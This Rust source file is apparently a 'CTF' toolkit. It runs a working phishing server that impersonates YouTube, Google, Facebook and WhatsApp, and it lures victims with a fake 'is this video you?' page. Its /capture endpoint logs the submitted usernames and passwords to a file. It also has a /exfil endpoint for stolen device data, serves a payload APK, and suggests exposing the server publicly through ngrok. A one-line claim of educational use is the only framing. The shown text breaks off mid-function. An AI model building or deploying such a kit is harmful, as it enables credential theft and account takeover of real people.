// ============================================================================
// 🏆 CTF MOBILE CAPTURE TOOLKIT — NEXUS ARSENAL v2.0
// ============================================================================
// Ingeniería social avanzada: "Mira, este video eres tú"
// Pretexto: foto/video borroso → login gate → captura de credenciales
// Para competencias educativas CTF con perímetro autorizado.
// ============================================================================

use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::io::{BufRead, BufReader, Read, Write};
use std::net::{TcpListener, TcpStream};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

// ────────────────────────────────────────────────────────────────────────────
// ESTRUCTURAS DE DATOS
// ────────────────────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
struct CredentialCapture {
    timestamp: String,
    username: String,
    password: String,
    user_agent: String,
    ip: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct DataExfilPayload {
    device_id: String,
    data_type: String,
    content: String,
    timestamp: String,
}

#[derive(Debug)]
struct CaptureServer {
    captured_creds: Arc<Mutex<Vec<CredentialCapture>>>,
    exfiltrated_data: Arc<Mutex<Vec<DataExfilPayload>>>,
    running: Arc<AtomicBool>,
    server_ip: String,
    port: u16,
}

// ────────────────────────────────────────────────────────────────────────────
// PLANTILLAS HTML — usando r##"..."## para evitar conflicto con "#" en HTML
// ────────────────────────────────────────────────────────────────────────────

/// Página de aterrizaje: video thumbnail borroso con gancho de curiosidad
/// Dice "Mira, este video eres tú?" — al hacer clic → login gate
fn landing_video_page() -> &'static str {
    r##"<html>
<head><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<link rel="manifest" href="/manifest.json">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Roboto,Arial,sans-serif;background:#0f0f0f;color:#fff;min-height:100vh}
.header{background:#0f0f0f;padding:8px 16px;display:flex;align-items:center;border-bottom:1px solid #272727;position:sticky;top:0;z-index:10}
.logo{display:flex;align-items:center;gap:4px}
.logo-icon{background:#ff0000;width:28px;height:20px;border-radius:5px;display:flex;align-items:center;justify-content:center}
.logo-text{font-size:17px;font-weight:700;letter-spacing:-.5px;color:#fff}
.v-wrap{max-width:600px;margin:0 auto;padding:12px 16px}
.thumb-wrap{text-decoration:none;color:inherit;display:block}
.thumbnail{position:relative;width:100%;aspect-ratio:16/9;background:linear-gradient(145deg,#0a0a1a 0%,#1a1a3e 30%,#0d1b2a 70%,#1b2838 100%);border-radius:12px;overflow:hidden;cursor:pointer;border:1px solid #333}
.blur-layer{position:absolute;inset:0;background:radial-gradient(ellipse at 40% 40%,#3a3a6a 0%,transparent 60%),radial-gradient(ellipse at 70% 60%,#2a2a5a 0%,transparent 50%);filter:blur(18px);opacity:0.7}
.silhouette{position:absolute;bottom:10%;left:50%;transform:translateX(-50%);width:35%;height:55%;background:radial-gradient(ellipse at 50% 30%,#4a4a7a 0%,transparent 70%);filter:blur(6px);opacity:0.5}
.overlay{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;background:rgba(0,0,0,0.45);z-index:2}
.sensitive-badge{padding:5px 14px;border-radius:4px;font-size:12px;font-weight:600;background:rgba(255,50,50,0.2);color:#ff4444;border:1px solid rgba(255,68,68,0.35);backdrop-filter:blur(4px);margin-bottom:14px;letter-spacing:.5px}
.play-circle{width:66px;height:48px;background:rgba(255,255,255,.92);border-radius:14px;display:flex;align-items:center;justify-content:center;transition:transform .12s;box-shadow:0 4px 20px rgba(0,0,0,.6)}
.play-circle:after{content:'';display:block;border-left:20px solid #0f0f0f;border-top:12px solid transparent;border-bottom:12px solid transparent;margin-left:5px}
.play-circle:active{transform:scale(.95)}
.pulse-ring{position:absolute;width:80px;height:62px;border-radius:16px;border:2px solid rgba(255,255,255,.2);animation:pulse 2s infinite;pointer-events:none}
@keyframes pulse{0%{transform:scale(1);opacity:.5}100%{transform:scale(1.3);opacity:0}}
.pwa-banner{display:none;background:#1a73e8;color:#fff;padding:12px 16px;border-radius:8px;margin-top:20px;align-items:center;justify-content:space-between;gap:10px}
.pwa-btn{background:#fff;color:#1a73e8;border:none;padding:8px 14px;border-radius:6px;font-weight:600;font-size:13px;cursor:pointer}
.tap-hint{color:rgba(255,255,255,.85);font-size:13px;margin-top:14px;text-shadow:0 1px 6px rgba(0,0,0,.9);font-weight:500;letter-spacing:.3px}
.progress-bar{position:absolute;bottom:0;left:0;right:0;height:4px;background:rgba(255,255,255,.15)}
.progress-fill{height:100%;width:35%;background:#ff0000;border-radius:0 2px 2px 0}
.v-info{padding:10px 0}
.v-title{font-size:17px;font-weight:600;line-height:1.3;margin-bottom:5px;color:#fff}
.v-meta{font-size:13px;color:#aaa;margin-bottom:8px;display:flex;gap:6px;flex-wrap:wrap}
.v-channel{display:flex;align-items:center;gap:10px;padding:10px 0;border-top:1px solid #272727;margin-top:4px}
.ch-avatar{width:38px;height:38px;border-radius:50%;background:linear-gradient(135deg,#ff0000,#cc0000);display:flex;align-items:center;justify-content:center;color:white;font-weight:700;font-size:14px;flex-shrink:0}
.ch-name{font-size:14px;font-weight:500;color:#fff}
.ch-subs{font-size:12px;color:#aaa}
.v-desc{background:#272727;border-radius:10px;padding:12px;font-size:13px;line-height:1.6;color:#ccc;margin-top:6px}
.v-desc .tag{color:#3ea6ff;cursor:pointer}
.v-desc .alert-line{color:#ff6b6b;font-weight:500;margin-top:8px;padding-top:8px;border-top:1px solid #3f3f3f}
.footer-note{text-align:center;padding:16px 0;font-size:11px;color:#555}
</style>
</head>
<body>
<div class="header">
<div class="logo"><div class="logo-icon"><svg width="14" height="14" viewBox="0 0 24 24" fill="#fff"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg></div><span class="logo-text">YouTube</span></div>
</div>
<div class="v-wrap">
<a class="thumb-wrap" href="/acceso">
<div class="thumbnail">
<div class="blur-layer"></div>
<div class="silhouette"></div>
<div class="overlay">
<div class="sensitive-badge">🔞 VIDEO PRIVADO</div>
<div class="play-circle"></div>
<div class="pulse-ring"></div>
<div class="tap-hint">Toca para verificar e identificar</div>
</div>
<div class="progress-bar"><div class="progress-fill"></div></div>
</div>
</a>
<div id="pwaBanner" class="pwa-banner">
    <div style="font-size:13px">⬇️ <b>Instala NexusPlayer</b> para ver sin censura</div>
    <button class="pwa-btn" id="installBtn">INSTALAR</button>
</div>
<div class="v-info">
<div class="v-title">¿Eres tú en este video? 📹 Alguien te etiquetó</div>
<div class="v-meta"><span>1,247 vistas</span><span>•</span><span>hace 3 horas</span><span>•</span><span>#8 en Tendencias</span></div>
<div class="v-channel">
<div class="ch-avatar">A</div>
<div><div class="ch-name">AnonUser</div><div class="ch-subs">14 suscriptores</div></div>
</div>
<div class="v-desc">
<span class="tag">#AlguienTeBusca</span> <span class="tag">#VideoViral</span> <span class="tag">#Identificado</span>
<br><br>
"Subieron esto hace unas horas y varias personas te etiquetaron diciendo que sales en el video. Fue grabado cerca de tu zona."
<div class="alert-line">🔒 Este video contiene informacion personal. Para proteger tu privacidad, debes iniciar sesion y verificar tu identidad antes de acceder al contenido.</div>
</div>
</div>
<div class="footer-note">© 2026 YouTube, LLC</div>
</div>
<script>
let deferredPrompt;
window.addEventListener('beforeinstallprompt', (e) => {
  e.preventDefault();
  deferredPrompt = e;
  document.getElementById('pwaBanner').style.display = 'flex';
});
document.getElementById('installBtn').addEventListener('click', async () => {
  if (deferredPrompt) {
    deferredPrompt.prompt();
    const { outcome } = await deferredPrompt.userChoice;
    deferredPrompt = null;
  } else {
    // Si no hay prompt del sistema, dar instrucciones manuales convincentes
    alert("Para instalar: Toca los 3 puntos (⋮) o el icono de Compartir (⎙) y selecciona 'Instalar aplicación' o 'Agregar a inicio'.");
  }
});

// Mostrar el banner siempre después de 2 segundos para asegurar visibilidad
setTimeout(() => {
    document.getElementById('pwaBanner').style.display = 'flex';
}, 2000);

if ('serviceWorker' in navigator) {
  window.addEventListener('load', () => {
    navigator.serviceWorker.register('/sw.js');
  });
}
</script>
</body></html>"##
}

/// Login gate con tabs Google/Facebook — "Para acceder al video, inicia sesion"
/// Sirve para las rutas /acceso, /google, /facebook
fn login_gate_html(active_tab: &str) -> String {
    let google_selected = if active_tab == "google" || active_tab.is_empty() { "selected" } else { "" };
    let facebook_selected = if active_tab == "facebook" { "selected" } else { "" };
    let whatsapp_selected = if active_tab == "whatsapp" { "selected" } else { "" };
    let google_show = if active_tab == "facebook" { "display:none" } else if active_tab == "whatsapp" { "display:none" } else { "display:block" };
    let fb_show = if active_tab == "facebook" { "display:block" } else { "display:none" };
    let wa_show = if active_tab == "whatsapp" { "display:block" } else { "display:none" };

    format!(r##"<html>
<head><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:Roboto,Arial,sans-serif;background:#0f0f0f;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:16px;color:#fff}}
.card{{width:100%;max-width:400px;background:rgba(30,30,30,.96);border-radius:16px;padding:28px 24px 32px;box-shadow:0 8px 40px rgba(0,0,0,.8);border:1px solid #333}}
.lock-icon{{width:56px;height:56px;border-radius:50%;background:rgba(255,255,255,.06);display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-size:26px}}
h1{{font-size:20px;font-weight:600;text-align:center;margin-bottom:6px}}
.sub{{text-align:center;color:#aaa;font-size:13px;margin-bottom:24px;line-height:1.5}}
.tabs{{display:flex;gap:0;margin-bottom:22px;border-radius:10px;overflow:hidden;border:1px solid #333}}
.tab{{flex:1;padding:10px;text-align:center;font-size:14px;font-weight:500;cursor:pointer;background:rgba(255,255,255,.04);color:#888;border:none;transition:all .15s;display:flex;align-items:center;justify-content:center;gap:6px}}
.tab.selected{{background:rgba(255,255,255,.08);color:#fff;font-weight:600}}
.tab:hover{{background:rgba(255,255,255,.07)}}
.form-pane{{}}
.form-group{{margin-bottom:16px}}
label{{display:block;font-size:13px;color:#bbb;margin-bottom:5px;font-weight:500}}
input{{width:100%;padding:12px 14px;background:rgba(255,255,255,.06);border:1px solid #444;border-radius:8px;color:#fff;font-size:15px;outline:none;transition:border .15s}}
input:focus{{border-color:#3ea6ff;background:rgba(62,166,255,.05)}}
input::placeholder{{color:#666}}
.btn{{width:100%;padding:12px;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;transition:opacity .15s;display:flex;align-items:center;justify-content:center;gap:8px;margin-top:6px}}
.btn-google{{background:#1a73e8;color:#fff}}
.btn-google:hover{{opacity:.9}}
.btn-facebook{{background:#1877f2;color:#fff}}
.btn-facebook:hover{{opacity:.9}}
.divider{{text-align:center;color:#555;font-size:12px;margin:14px 0 8px}}
.footer-text{{text-align:center;color:#666;font-size:11px;margin-top:16px;line-height:1.5}}
.back-link{{display:inline-block;color:#3ea6ff;font-size:12px;text-decoration:none;margin-top:12px;padding:6px 12px;border-radius:6px;background:rgba(62,166,255,.06)}}
.back-link:hover{{background:rgba(62,166,255,.12)}}
.qr-container{{text-align:center;padding:10px 0}}
.qr-container img{{width:240px;height:240px;image-rendering:pixelated;border-radius:8px;background:#fff;padding:8px;display:block;margin:0 auto 12px}}
.qr-label{{font-size:14px;color:#ccc;margin-bottom:6px}}
.qr-hint{{font-size:12px;color:#888}}
.wa-btn{{width:100%;padding:12px;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;background:#25D366;color:#fff;margin-top:14px}}
.wa-btn:hover{{opacity:.9}}
</style>
</head>
<body>
<div class="card">
<div class="lock-icon">🔒</div>
<h1>Acceso requerido</h1>
<p class="sub">Para acceder al video privado,<br>verifica tu identidad</p>
<div class="tabs">
<button class="tab {google_selected}" onclick="switchTab('google')">
<svg width="16" height="16" viewBox="0 0 48 48"><path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"/><path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"/><path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"/><path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"/></svg>
Google
</button>
<button class="tab {facebook_selected}" onclick="switchTab('facebook')">
<svg width="16" height="16" viewBox="0 0 48 48"><path fill="#1877F2" d="M24 5C13.5 5 5 13.5 5 24c0 9.5 6.9 17.3 15.9 18.8V29.5h-4.8V24h4.8v-4.2c0-4.7 2.8-7.3 7.1-7.3 2.1 0 4.2.4 4.2.4v4.6h-2.4c-2.3 0-3.1 1.5-3.1 3v3.5h5.2l-.8 5.5H26.7v13.3C36.1 41.3 43 33.5 43 24c0-10.5-8.5-19-19-19z"/><path fill="#fff" d="M31.2 29.5l.8-5.5H26.7v-3.5c0-1.5.8-3 3.1-3h2.4v-4.6s-2.1-.4-4.2-.4c-4.3 0-7.1 2.6-7.1 7.3V24h-4.8v5.5h4.8v13.3c1.9.3 3.9.5 5.9.5s4-.2 5.9-.5V29.5h3.6z"/></svg>
Facebook
</button>
<button class="tab {whatsapp_selected}" onclick="switchTab('whatsapp')">
<svg width="16" height="16" viewBox="0 0 48 48"><path fill="#25D366" d="M24 4C13.1 4 4.2 12.9 4.2 23.8c0 3.5.9 6.9 2.7 9.9L4 44l10.7-2.8c2.9 1.6 6.2 2.4 9.6 2.4h.1c10.9 0 19.8-8.9 19.8-19.8C44.2 12.9 35.3 4 24.3 4h-.3z"/><path fill="#fff" d="M19.1 14.5c-.4-.9-.8-1-.9-1-.1 0-.4 0-1.1.4-.5.3-2 2-2 4.8s2.1 5.6 2.4 6c.3.4 4.1 6.3 10 7.9 1.4.4 2.5.6 3.4.8 1.4.3 2.7.2 3.7.1 1.2-.1 3.7-1.5 4.2-3 .5-1.4.5-2.6.3-2.9-.1-.2-.4-.4-1-.6s-3-.9-3.5-1.1c-.5-.1-.9-.1-1.2.3-.3.4-1.1 1.5-1.4 1.8-.2.2-.5.2-.9 0-.4-.2-1.5-.6-2.9-1.8-1.1-1-1.7-2.2-1.9-2.5-.3-.3-.2-.7.1-1 .3-.3.7-.8.9-1 .2-.2.3-.4.1-.7-.1-.2-.5-1.1-.8-1.8"/></svg>
WhatsApp
</button>
</div>

<div id="googlePane" class="form-pane" style="{google_show}">
<form action="/capture" method="POST">
<div class="form-group"><label>Correo electronico</label>
<input type="email" name="username" placeholder="tu@gmail.com" required autofocus></div>
<div class="form-group"><label>Contrasena</label>
<input type="password" name="password" placeholder="Contrasena" required></div>
<button type="submit" class="btn btn-google">
<svg width="16" height="16" viewBox="0 0 48 48"><path fill="#fff" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"/><path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"/><path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"/><path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"/></svg>
Siguiente
</button>
</form>
<div class="divider">o</div>
<div style="text-align:center;color:#aaa;font-size:12px">¿Olvidaste tu contrasena?</div>
</div>

<div id="facebookPane" class="form-pane" style="{fb_show}">
<form action="/capture" method="POST">
<div class="form-group"><label>Correo o telefono</label>
<input type="text" name="email" placeholder="Correo o telefono" required></div>
<div class="form-group"><label>Contrasena</label>
<input type="password" name="pass" placeholder="Contrasena" required></div>
<button type="submit" class="btn btn-facebook">
<svg width="16" height="16" viewBox="0 0 48 48"><path fill="#fff" d="M24 5C13.5 5 5 13.5 5 24c0 9.5 6.9 17.3 15.9 18.8V29.5h-4.8V24h4.8v-4.2c0-4.7 2.8-7.3 7.1-7.3 2.1 0 4.2.4 4.2.4v4.6h-2.4c-2.3 0-3.1 1.5-3.1 3v3.5h5.2l-.8 5.5H26.7v13.3C36.1 41.3 43 33.5 43 24c0-10.5-8.5-19-19-19z"/></svg>
Iniciar sesion
</button>
</form>
<div class="divider">o</div>
<div style="text-align:center;color:#aaa;font-size:12px">¿Olvidaste tu contrasena?</div>
</div>

<div id="whatsappPane" class="form-pane" style="{wa_show}">
<div class="qr-container">
<p class="qr-label">Escanea este codigo con WhatsApp</p>
<img id="whatsappQR" src="/qr-image" alt="Escanea con WhatsApp">
<p class="qr-hint">Abre WhatsApp en tu telefono →<br>Menu → WhatsApp Web → Escanea codigo</p>
<button class="wa-btn" onclick="window.location.href='whatsapp:';">
📱 Abrir WhatsApp
</button>
</div>
</div>

<div class="footer-text">Tus datos estan protegidos con cifrado de extremo a extremo.<br>Al verificar tu identidad, podras acceder al video privado.</div>
<a class="back-link" href="/">← Volver al video</a>
</div>

<script>
function switchTab(tab){{
if(tab==='google'){{
document.getElementById('googlePane').style.display='block';
document.getElementById('facebookPane').style.display='none';
document.getElementById('whatsappPane').style.display='none';
document.querySelectorAll('.tab')[0].classList.add('selected');
document.querySelectorAll('.tab')[1].classList.remove('selected');
document.querySelectorAll('.tab')[2].classList.remove('selected');
}}else if(tab==='facebook'){{
document.getElementById('googlePane').style.display='none';
document.getElementById('facebookPane').style.display='block';
document.getElementById('whatsappPane').style.display='none';
document.querySelectorAll('.tab')[1].classList.add('selected');
document.querySelectorAll('.tab')[0].classList.remove('selected');
document.querySelectorAll('.tab')[2].classList.remove('selected');
}}else{{
document.getElementById('googlePane').style.display='none';
document.getElementById('facebookPane').style.display='none';
document.getElementById('whatsappPane').style.display='block';
document.querySelectorAll('.tab')[2].classList.add('selected');
document.querySelectorAll('.tab')[0].classList.remove('selected');
document.querySelectorAll('.tab')[1].classList.remove('selected');
}};
if(window.history){{window.history.replaceState(null,'',tab==='google'?'/acceso':tab==='facebook'?'/acceso?tab=facebook':'/acceso?tab=whatsapp');}}
}}
// Auto-refresh QR cada 5 segundos
setInterval(function(){{
var img = document.getElementById('whatsappQR');
if(img){{img.src = '/qr-image?t=' + new Date().getTime();}}
}}, 5000);
</script>
</body></html>"##,
    google_selected = google_selected,
    facebook_selected = facebook_selected,
    whatsapp_selected = whatsapp_selected,
    google_show = google_show,
    fb_show = fb_show,
    wa_show = wa_show
    )
}

fn phishing_whatsapp() -> &'static str {
    r##"<html>
<head><meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;margin:0;padding:0;background:#ece5dd;display:flex;justify-content:center;align-items:center;height:100vh}
.card{max-width:350px;width:100%;background:white;border-radius:8px;overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,0.2)}
.header{background:#075e54;color:white;padding:16px;text-align:center;font-size:18px;font-weight:bold}
.body{padding:24px}
.body p{color:#667781;font-size:14px;margin:0 0 20px 0;text-align:center}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #e0e0e0;border-radius:4px;font-size:15px;box-sizing:border-box;background:#f0f2f5}
button{width:100%;padding:12px;background:#00a884;color:white;border:none;border-radius:24px;font-size:15px;cursor:pointer;font-weight:bold}
button:hover{background:#06cf9c}
</style></head>
<body>
<div class="card">
<div class="header">WhatsApp Web</div>
<div class="body">
<p>Para acceder al chat del torneo, vincula tu WhatsApp</p>
<input type="text" name="phone" placeholder="Numero de telefono" required>
<input type="text" name="code" placeholder="Codigo de verificacion" required>
<button onclick="window.location.href='/capture?'+new URLSearchParams({phone:document.querySelector('input[name=phone]').value,code:document.querySelector('input[name=code]').value})">Vincular dispositivo</button>
</div>
</div>
</body></html>"##
}

fn success_page() -> &'static str {
    r##"<html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<style>*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Roboto,Arial,sans-serif;background:#0f0f0f;min-height:100vh;display:flex;align-items:center;justify-content:center;color:#fff;padding:20px}
.card{text-align:center;max-width:340px;width:100%}
.spinner{width:48px;height:48px;border:4px solid rgba(255,255,255,.1);border-top-color:#3ea6ff;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 20px}
@keyframes spin{to{transform:rotate(360deg)}}
h2{font-size:18px;font-weight:600;margin-bottom:6px;color:#4caf50}
p{color:#aaa;font-size:14px;line-height:1.5}
.check{font-size:40px;margin-bottom:12px}
</style></head>
<body>
<div class="card">
<div class="check">✅</div>
<h2>Identidad verificada</h2>
<p>Redirigiendo al video privado...</p>
<div class="spinner"></div>
<p style="font-size:12px;color:#555;margin-top:16px">Cifrado AES-256 • Acceso temporal concedido</p>
</div>
<script>setTimeout(function(){window.location.href='https://www.youtube.com/watch?v=dQw4w9WgXcQ'},3000)</script>
</body></html>"##
}

fn apk_not_found_page() -> &'static str {
    r##"<html><body><h2>APK no generado</h2><p>Usa: python3 tools/ctf_arsenal/gen_payload.py</p></body></html>"##
}

// ────────────────────────────────────────────────────────────────────────────
// SERVIDOR DE CAPTURA
// ────────────────────────────────────────────────────────────────────────────

#[allow(dead_code)]
impl CaptureServer {
    fn new(ip: &str, port: u16) -> Self {
        Self {
            captured_creds: Arc::new(Mutex::new(Vec::new())),
            exfiltrated_data: Arc::new(Mutex::new(Vec::new())),
            running: Arc::new(AtomicBool::new(false)),
            server_ip: ip.to_string(),
            port,
        }
    }

    fn start(&self) {
        self.running.store(true, Ordering::SeqCst);
        let addr = format!("0.0.0.0:{}", self.port);
        let listener = TcpListener::bind(&addr).expect("Failed to bind port");
        println!("  \u{1f3af} Server listening on http://0.0.0.0:{}", self.port);
        println!("  \u{1f517} Expose with: ngrok http {}", self.port);

        let captured_creds = self.captured_creds.clone();
        let exfiltrated_data = self.exfiltrated_data.clone();
        let running = self.running.clone();

        thread::spawn(move || {
            listener.set_nonblocking(true).ok();
            for stream in listener.incoming() {
                if !running.load(Ordering::SeqCst) {
                    break;
                }
                match stream {
                    Ok(stream) => {
                        handle_connection(stream, &captured_creds, &exfiltrated_data);
                    }
                    Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                        thread::sleep(Duration::from_millis(50));
                        continue;
                    }
                    Err(e) => {
                        eprintln!("  \u{26a0}\u{fe0f} Connection error: {}", e);
                    }
                }
            }
        });
    }

    fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }

    fn print_summary(&self) {
        let creds = self.captured_creds.lock().unwrap();
        let data = self.exfiltrated_data.lock().unwrap();

        println!("\n  \u{250c}{}\u{252c}{}\u{2510}", "\u{2500}".repeat(37), "\u{2500}".repeat(37));
        println!("  \u{2502}  \u{1f4ca} CAPTURE SUMMARY");
        println!("  \u{251c}{}\u{253c}{}\u{2524}", "\u{2500}".repeat(37), "\u{2500}".repeat(37));
        println!("  \u{2502}  Credentials captured:  {}", creds.len());
        println!("  \u{2502}  Data exfiltrated:      {}", data.len());
        println!("  \u{2514}{}\u{2534}{}\u{2518}", "\u{2500}".repeat(37), "\u{2500}".repeat(37));

        for (i, cred) in creds.iter().enumerate() {
            println!("\n  \u{1f510} Credential #{}:", i + 1);
            println!("     User: {}", cred.username);
            println!("     Pass: {}", cred.password);
            println!("     IP:   {}", cred.ip);
            let ua = &cred.user_agent;
            println!("     UA:   {}", &ua[..ua.len().min(60)]);
        }

        for (i, d) in data.iter().enumerate() {
            println!("\n  \u{1f4c1} Exfil #{}:", i + 1);
            println!("     Type: {}", d.data_type);
            println!("     Size: {} bytes", d.content.len());
        }
    }
}

// ────────────────────────────────────────────────────────────────────────────
// MANEJADOR DE CONEXIONES HTTP
// ────────────────────────────────────────────────────────────────────────────

fn handle_connection(
    mut stream: TcpStream,
    captured_creds: &Arc<Mutex<Vec<CredentialCapture>>>,
    exfiltrated_data: &Arc<Mutex<Vec<DataExfilPayload>>>,
) {
    let peer = stream.peer_addr().ok();
    let mut reader = BufReader::new(stream.try_clone().unwrap());
    let mut request_line = String::new();

    if reader.read_line(&mut request_line).is_err() {
        return;
    }

    let parts: Vec<&str> = request_line.split_whitespace().collect();
    if parts.len() < 2 {
        return;
    }

    let method = parts[0];
    let path = parts[1];

    // Read headers
    let mut user_agent = String::new();
    let mut content_length: usize = 0;
    let mut _headers = HashMap::new();

    loop {
        let mut line = String::new();
        if reader.read_line(&mut line).is_err() || line.trim().is_empty() {
            break;
        }
        let trimmed = line.trim();
        if let Some(pos) = trimmed.find(':') {
            let key = trimmed[..pos].trim().to_lowercase();
            let value = trimmed[pos + 1..].trim().to_string();
            if key == "user-agent" {
                user_agent = value.clone();
            }
            if key == "content-length" {
                content_length = value.parse::<usize>().unwrap_or(0);
            }
            _headers.insert(key, value);
        }
    }

    // Read body if POST
    let mut body = Vec::new();
    if method == "POST" && content_length > 0 {
        body.resize(content_length, 0);
        reader.read_exact(&mut body).ok();
    }

    let body_str = String::from_utf8_lossy(&body);
    let ip = peer.map(|p| p.ip().to_string()).unwrap_or_else(|| "unknown".to_string());
    let timestamp = chrono_now();

    // Route handler
    match path {
        // Landing page: blurry video thumbnail hook
        "/" => {
            respond_html(&mut stream, landing_video_page());
        }

        // Login gate with tabs (Google | Facebook | WhatsApp QR)
        // WhatsApp tab shows QR via /qr-image proxy
        "/acceso" | "/google" => {
            let html = login_gate_html("google");
            respond_html(&mut stream, &html);
        }

        "/facebook" => {
            let html = login_gate_html("facebook");
            respond_html(&mut stream, &html);
        }

        "/whatsapp" => {
            respond_html(&mut stream, phishing_whatsapp());
        }

        // Capture endpoint — accepts both Google and Facebook field names
        "/capture" => {
            let params: HashMap<String, String> = if method == "POST" {
                body_str
                    .split('&')
                    .filter_map(|pair| {
                        let mut iter = pair.splitn(2, '=');
                        Some((
                            url_decode(iter.next()?).to_string(),
                            url_decode(iter.next()?).to_string(),
                        ))
                    })
                    .collect()
            } else {
                path.split('?')
                    .nth(1)
                    .unwrap_or("")
                    .split('&')
                    .filter_map(|pair| {
                        let mut iter = pair.splitn(2, '=');
                        Some((
                            url_decode(iter.next()?).to_string(),
                            url_decode(iter.next()?).to_string(),
                        ))
                    })
                    .collect()
            };

            // Accept Google fields (username, password) and Facebook fields (email, pass)
            let cred_username = params
                .get("username")
                .or(params.get("email"))
                .or(params.get("phone"))
                .cloned()
                .unwrap_or_default();
            let cred_password = params
                .get("password")
                .or(params.get("pass"))
                .or(params.get("code"))
                .cloned()
                .unwrap_or_default();

            let cred = CredentialCapture {
                timestamp: timestamp.clone(),
                username: cred_username,
                password: cred_password,
                user_agent: user_agent.clone(),
                ip: ip.clone(),
            };

            {
                let mut store = captured_creds.lock().unwrap();
                store.push(cred.clone());
                let provider = if params.contains_key("email") { "Facebook" } else { "Google" };
                println!("  \u{1f510} [{provider}] CAPTURED: {} / {}", cred.username, cred.password);
            }

            let log_entry = serde_json::to_string(&cred).unwrap_or_default();
            let mut file = std::fs::OpenOptions::new()
                .create(true)
                .append(true)
                .open("captured_creds.jsonl")
                .unwrap();
            writeln!(file, "{}", log_entry).ok();

            respond_html(&mut stream, success_page());
        }

        "/exfil" if method == "POST" => {
            match serde_json::from_slice::<DataExfilPayload>(&body) {
                Ok(payload) => {
                    println!("  \u{1f4c1} EXFIL: {} from {} ({} bytes)", payload.data_type, payload.device_id, payload.content.len());
                    {
                        let mut store = exfiltrated_data.lock().unwrap();
                        store.push(payload);
                    }
                    respond_json(&mut stream, r#"{"status":"ok"}"#);
                }
                Err(e) => {
                    eprintln!("  \u{26a0}\u{fe0f} Invalid exfil payload: {}", e);
                    respond_json(&mut stream, r#"{"status":"error","message":"invalid"}"#);
                }
            }
        }

        "/payload.apk" => {
            let apk_path = "payload.apk";
            if let Ok(apk_data) = std::fs::read(apk_path) {
                respond_bytes(&mut stream, "application/vnd.android.package-archive", &apk_data);
            } else {
                respond_html(&mut stream, apk_not_found_page());
            }
        }

        "/status" => {
            let creds_count = captured_creds.lock().unwrap().len();
            let data_count = exfiltrated_data.lock().unwrap().len();
            let html = format!(
                r##"<html><head><meta name="viewport" content="width=device-width,initial-scale=1">
                <style>body{{font-family:monospace;background:#0d1117;color:#c9d1d9;padding:40px}}
